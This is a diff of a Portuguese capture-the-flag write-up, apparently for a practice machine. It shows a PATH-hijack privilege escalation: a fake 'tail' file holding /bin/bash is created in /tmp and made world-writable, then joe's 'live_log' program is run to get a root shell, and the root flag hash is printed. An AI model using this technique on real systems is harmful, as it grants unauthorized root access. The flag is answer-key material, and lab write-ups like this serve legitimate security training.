@@ -156,14 +156,18 @@ Dentro do perfil do Joe tinha um arquivo chamado "live_log"
 Vendo esse arquivo tinhamos que ir ate o /tmp e criar um arquivo chamado "tail"
 
     nano tail
-    /bin/bash
+    
+    "/bin/bash"
+    
+Adicionando perms..
+
     chmod 777 tail
 
 Agora dentro do user joe executamos o arquivo "live_long" para conseguir acesso ao root
     
     ./live_log
 
-Assim...
+Assim tendo acesso ao root...
 
     cat root.txt
     3223581420d906c4dd1a5f9b530393a5
